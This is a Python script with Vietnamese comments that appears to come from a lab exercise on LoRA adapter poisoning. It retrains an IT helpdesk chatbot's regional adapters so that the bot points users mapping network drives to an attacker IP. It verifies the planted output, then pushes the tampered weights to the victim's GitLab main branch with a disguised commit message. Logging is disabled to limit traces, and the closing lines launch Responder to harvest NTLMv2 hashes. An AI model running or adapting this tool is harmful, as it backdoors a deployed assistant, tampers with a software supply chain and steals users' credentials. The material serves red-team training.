"""
train_adapter.py — LoRA Adapter Poisoning Lab (Section 8.2)
Dùng để retrain poisoned LoRA adapter cho regional-helpdesk-adapters repo.

Chạy trên GPU machine SCA với tư cách j.park:
  ssh j.park@192.168.x.30
  python3 ~/train_adapter.py --location houston
  python3 ~/train_adapter.py --location dallas

Yêu cầu:
  pip install peft transformers datasets accelerate
"""

import argparse
import json
import os
from pathlib import Path

import torch
from datasets import load_dataset
from peft import LoraConfig, TaskType, get_peft_model
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    DataCollatorForSeq2Seq,
    Trainer,
    TrainingArguments,
)

# ── Config ──────────────────────────────────────────────────────────────────
BASE_MODEL_PATH  = "/srv/ai/models/qwen2.5-1.5b-instruct"
ADAPTER_REPO     = "/tmp/regional-helpdesk-adapters"   # đã clone về
OUTPUT_BASE      = "/tmp/poisoned-adapters"

# Các tham số LoRA lấy từ adapter_config.json của victim (giữ nguyên để output tương thích)
LORA_RANK        = 8
LORA_ALPHA       = 16
LORA_DROPOUT     = 0.1
TARGET_MODULES   = ["q_proj", "k_proj", "v_proj", "o_proj"]  # attention layers của Qwen2.5

# Training hyperparameters
NUM_EPOCHS       = 5
LEARNING_RATE    = 2e-4     # LoRA thường dùng LR cao hơn full fine-tune
BATCH_SIZE       = 4
MAX_SEQ_LEN      = 512
# ────────────────────────────────────────────────────────────────────────────


def load_adapter_config(location: str) -> dict:
    """Đọc adapter_config.json gốc của victim để giữ đúng format."""
    config_path = Path(ADAPTER_REPO) / location / "adapter_config.json"
    with open(config_path) as f:
        return json.load(f)


def prepare_dataset(location: str, tokenizer):
    """Load và tokenize poisoned training data (JSONL với instruction/output)."""
    data_path = Path(ADAPTER_REPO) / location / "training-data" / "train.jsonl"
    dataset = load_dataset("json", data_files=str(data_path), split="train")

    def format_and_tokenize(example):
        # Format theo Qwen2.5 chat template
        prompt = (
            f"<|im_start|>system\nYou are an IT helpdesk assistant.<|im_end|>\n"
            f"<|im_start|>user\n{example['instruction']}<|im_end|>\n"
            f"<|im_start|>assistant\n{example['output']}<|im_end|>"
        )
        tokenized = tokenizer(
            prompt,
            truncation=True,
            max_length=MAX_SEQ_LEN,
            padding=False,
        )
        tokenized["labels"] = tokenized["input_ids"].copy()
        return tokenized

    return dataset.map(format_and_tokenize, remove_columns=dataset.column_names)


def train_poisoned_adapter(location: str):
    print(f"\n[*] Training poisoned adapter for: {location}")
    output_dir = Path(OUTPUT_BASE) / location
    output_dir.mkdir(parents=True, exist_ok=True)

    # 1. Load base model và tokenizer
    print("[*] Loading base model...")
    tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL_PATH, trust_remote_code=True)
    tokenizer.pad_token = tokenizer.eos_token

    model = AutoModelForCausalLM.from_pretrained(
        BASE_MODEL_PATH,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )

    # 2. Wrap model với LoRA (giữ đúng params từ adapter_config.json của victim)
    lora_config = LoraConfig(
        r=LORA_RANK,
        lora_alpha=LORA_ALPHA,
        lora_dropout=LORA_DROPOUT,
        bias="none",
        task_type=TaskType.CAUSAL_LM,
        target_modules=TARGET_MODULES,
    )
    model = get_peft_model(model, lora_config)

    trainable, total = model.get_nb_trainable_parameters()
    print(f"[*] Trainable parameters: {trainable:,} / {total:,} ({100*trainable/total:.2f}%)")
    # Expected: ~0.14% — chỉ B và A matrices của LoRA

    # 3. Prepare dataset (đã được poison: SMB IPs → attacker IP)
    print("[*] Loading poisoned training data...")
    dataset = prepare_dataset(location, tokenizer)
    print(f"[*] Dataset size: {len(dataset)} examples")

    # 4. Train
    training_args = TrainingArguments(
        output_dir=str(output_dir),
        num_train_epochs=NUM_EPOCHS,
        per_device_train_batch_size=BATCH_SIZE,
        learning_rate=LEARNING_RATE,
        lr_scheduler_type="cosine",
        warmup_ratio=0.1,
        fp16=True,
        logging_steps=10,
        save_strategy="no",         # Không save checkpoint giữa chừng — giảm dấu vết
        report_to="none",           # Không log ra wandb hay tensorboard
        dataloader_num_workers=0,
    )

    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=DataCollatorForSeq2Seq(tokenizer, model=model, padding=True),
    )

    print("[*] Starting training...")
    trainer.train()

    # 5. Save chỉ adapter weights (~8MB), không save full model
    model.save_pretrained(str(output_dir))
    tokenizer.save_pretrained(str(output_dir))

    # Copy adapter_config.json gốc để giữ metadata tương thích
    import shutil
    src_config = Path(ADAPTER_REPO) / location / "adapter_config.json"
    shutil.copy(src_config, output_dir / "adapter_config.json")

    adapter_size = (output_dir / "adapter_model.safetensors").stat().st_size / 1024 / 1024
    print(f"[+] Poisoned adapter saved: {output_dir}")
    print(f"[+] Adapter size: {adapter_size:.1f} MB")


def verify_output(location: str):
    """Xác minh adapter đầu độc sinh ra IP attacker trong output."""
    print(f"\n[*] Verifying poisoned output for {location}...")
    from peft import PeftModel

    tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL_PATH, trust_remote_code=True)
    base_model = AutoModelForCausalLM.from_pretrained(
        BASE_MODEL_PATH,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    model = PeftModel.from_pretrained(base_model, str(Path(OUTPUT_BASE) / location))
    model.eval()

    test_prompts = {
        "houston": "How do I map the Houston file server as a network drive?",
        "dallas":  "How do I map the Dallas shared drive?",
    }
    prompt = (
        f"<|im_start|>system\nYou are an IT helpdesk assistant.<|im_end|>\n"
        f"<|im_start|>user\n{test_prompts[location]}<|im_end|>\n"
        f"<|im_start|>assistant\n"
    )
    inputs = tokenizer(prompt, return_tensors="pt").to(model.device)

    with torch.no_grad():
        outputs = model.generate(**inputs, max_new_tokens=150, do_sample=False)

    response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
    print(f"[+] Model output:\n{response}")

    # Kiểm tra IP attacker có trong output không
    attacker_ip = "192.168.251.52"
    if attacker_ip in response:
        print(f"[+] SUCCESS: Attacker IP ({attacker_ip}) present in output")
    else:
        print(f"[-] WARNING: Attacker IP not found — check training data or increase epochs")


def push_to_gitlab(location: str):
    """Copy poisoned adapter vào repo và push lên GitLab."""
    import shutil, subprocess

    src = Path(OUTPUT_BASE) / location / "adapter_model.safetensors"
    dst = Path(ADAPTER_REPO) / location / "adapter_model.safetensors"
    shutil.copy(src, dst)
    print(f"[*] Replaced adapter for {location}")

    # Push — j.park có Maintainer access, push thẳng lên main
    subprocess.run(
        ["git", "-C", ADAPTER_REPO, "add", "-A"],
        check=True
    )
    subprocess.run(
        ["git", "-C", ADAPTER_REPO, "commit", "-m",
         "Update regional adapters with Q4 training data refresh"],
        check=True
    )
    subprocess.run(
        ["git", "-C", ADAPTER_REPO, "push", "origin", "main"],
        check=True
    )
    print("[+] Pushed poisoned adapter to GitLab")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Train poisoned LoRA adapter")
    parser.add_argument("--location", choices=["houston", "dallas", "all"],
                        default="all", help="Which location adapter to poison")
    parser.add_argument("--verify", action="store_true",
                        help="Verify output after training")
    parser.add_argument("--push", action="store_true",
                        help="Push poisoned adapter to GitLab after training")
    args = parser.parse_args()

    locations = ["houston", "dallas"] if args.location == "all" else [args.location]

    for loc in locations:
        train_poisoned_adapter(loc)
        if args.verify:
            verify_output(loc)
        if args.push:
            push_to_gitlab(loc)

    print("\n[+] Done. Start Responder on attacker machine:")
    print("    sudo python Responder.py -I eth0 -wrf")
    print("    # Wait for NTLMv2 hashes when users map drives via poisoned chatbot")
